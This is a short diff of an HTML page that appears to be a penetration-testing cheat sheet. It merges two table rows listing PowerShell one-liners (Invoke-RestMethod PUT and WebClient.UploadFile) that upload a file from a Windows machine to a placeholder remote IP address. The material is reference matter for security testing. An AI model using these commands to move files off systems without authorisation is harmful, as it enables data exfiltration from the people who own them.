@@ -620,12 +620,11 @@
     <li>Upload to windows</li>
     <table>
         <tr>
-            <td>Upload with Powershell</td>
-            <td>Invoke-RestMethod -Method PUT -Uri &quot;http://&lt;ip address&gt;:&lt;port&gt;/&lt;file name&gt;&quot; -Body $variable</td>
-        </tr>
-        <tr>
-            <td>Upload with Powershell</td>
-            <td>powershell (New-Object System.Net.WebClient).UploadFile(&#039;http://&lt;ip address&gt;/&lt;file name&gt;&#039;, &#039;&lt;file name&gt;&#039;)</td>
+            <td>Upload with Powershell to Web Server</td>
+            <td>
+                <li>Invoke-RestMethod -Method PUT -Uri &quot;http://&lt;ip address&gt;:&lt;port&gt;/&lt;file name&gt;&quot; -Body $variable</li>
+                <li>powershell (New-Object System.Net.WebClient).UploadFile(&#039;http://&lt;ip address&gt;/&lt;file name&gt;&#039;, &#039;&lt;file name&gt;&#039;)</li>
+            </td>
         </tr>
         <tr>
             <td>
